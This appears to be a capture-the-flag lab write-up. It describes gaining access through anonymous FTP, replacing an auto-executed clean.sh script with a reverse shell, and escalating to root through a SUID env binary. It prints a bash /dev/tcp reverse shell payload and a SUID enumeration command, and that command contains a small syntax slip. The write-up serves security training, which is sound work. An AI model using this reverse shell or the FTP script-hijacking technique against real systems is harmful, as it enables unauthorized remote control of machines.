# Anonymous FTP Script Abuse and SUID Privilege Escalation

## Overview

The objective of this target was to gain initial access through an FTP service that allowed anonymous authentication and then escalate privileges to root by abusing a SUID-enabled binary.

The attack began with service enumeration, which revealed that the FTP server allowed anonymous login. After accessing the FTP service, we discovered a directory containing several files, including a Bash script named `clean.sh`.

Further analysis showed that the script was automatically executed by the target system. By modifying the script and adding a Reverse Shell payload, we were able to gain an initial shell on the target.

After gaining access, we performed local enumeration and searched for SUID-enabled binaries. This revealed that `/usr/bin/env` had the SUID bit set. Using the appropriate technique from GTFOBins, we successfully escalated our privileges to root.

# Enumeration

## Nmap Scan

We began by performing an Nmap scan against the target to identify the exposed services and discover potential attack vectors.

![](../Images/Pasted%20image%2020260828210601.png)

After identifying the open ports, we performed additional Nmap enumeration using version detection and Nmap scripts.

This allowed us to gather more detailed information about the services running on the target.

![](../Images/Pasted%20image%2020260828210637.png)

During the enumeration process, we discovered that the FTP service allowed anonymous authentication.

![](../Images/Pasted%20image%2020260828210719.png)

## Anonymous FTP Authentication

Since the FTP server allowed anonymous access, we authenticated using the following credentials:

```
username: Anonymous
password: Anonymous
```

![](../Images/Pasted%20image%2020260828210828.png)

After successfully logging in, we began enumerating the available files and directories.

We discovered a directory named `script`. After navigating into the directory, we found several files that were accessible through the FTP service.

To download the files for further analysis, we used:

```
mget*
```

This allowed us to retrieve multiple files from the current FTP directory.

![](../Images/Pasted%20image%2020260828210948.png)

# Exploitation

## Identifying the Automated Script

Among the downloaded files, we discovered a Bash script named:

```
clean.sh
```

Further inspection showed that the script was automatically executed by the target system and was responsible for cleaning or deleting files.

![](../Images/Pasted%20image%2020260828211055.png)

Since we were able to modify the script through the FTP service, we replaced its contents with a Reverse Shell payload.

If the target executed the modified script automatically, it would establish a connection back to our attacking machine.

## Creating a Reverse Shell

We modified the `clean.sh` script and inserted the following Bash Reverse Shell payload:

```
#!/bin/bash
bash -i >& /dev/tcp/Your IP/4444 0>&1
```

The payload instructs the target to establish a connection back to the attacking machine using the specified IP address and listening port.

![](../Images/Pasted%20image%2020260828211333.png)

## Starting a Listener

Before uploading the modified script, we started a Listener on the attacking machine to receive the incoming connection from the target.

![](../Images/Pasted%20image%2020260828211424.png)

## Uploading the Modified Script

We authenticated to the FTP service again and uploaded the modified script using:

```
put
```

The `put` command is used to upload a local file from the attacking machine to the FTP server.

![](../Images/Pasted%20image%2020260828211533.png)

Since the script was automatically executed by the target, we waited for the scheduled process to run.

After a few seconds, the target executed the modified script and established a connection back to our Listener.

We successfully obtained an initial shell on the target system.

![](../Images/Pasted%20image%2020260828211621.png)

# Privilege Escalation

## Enumerating SUID Binaries

After gaining an initial shell, we began searching for potential Privilege Escalation vectors.

One of the techniques we checked was the presence of SUID-enabled binaries.

We used the following command:

```
find / type -perm /4000 2>/dev/null
```

The purpose of this command was to search the filesystem for files with the SUID permission enabled while suppressing permission-related error messages.

During the enumeration process, we discovered an interesting binary:

```
/usr/bin/env
```

![](../Images/Pasted%20image%2020260828212030.png)

The `/usr/bin/env` binary had the SUID bit set, making it a potential Privilege Escalation vector.

## Abusing the SUID `env` Binary

To determine whether the SUID-enabled `/usr/bin/env` binary could be abused, we consulted GTFOBins.

GTFOBins documents techniques for abusing legitimate Linux binaries when they have dangerous permissions or configurations.

![](../Images/Pasted%20image%2020260828212130.png)

Using the appropriate GTFOBins technique for the SUID-enabled `/usr/bin/env` binary, we executed the required command and successfully obtained root privileges.

![](../Images/Pasted%20image%2020260828212154.png)

# Root Access

After abusing the SUID-enabled `env` binary, we successfully escalated our privileges and obtained root access on the target.

# Summary

This target demonstrated how multiple weaknesses can be chained together to achieve full system compromise.

The attack began with an exposed FTP service that allowed anonymous authentication. Further enumeration revealed a directory containing several files, including an automatically executed Bash script.

By modifying the `clean.sh` script and adding a Reverse Shell payload, we were able to obtain initial access to the target.

After gaining a shell, we performed local enumeration and searched for SUID-enabled binaries. This revealed that `/usr/bin/env` had the SUID bit set.

Using the appropriate technique from GTFOBins, we successfully abused the SUID configuration and escalated our privileges to root.

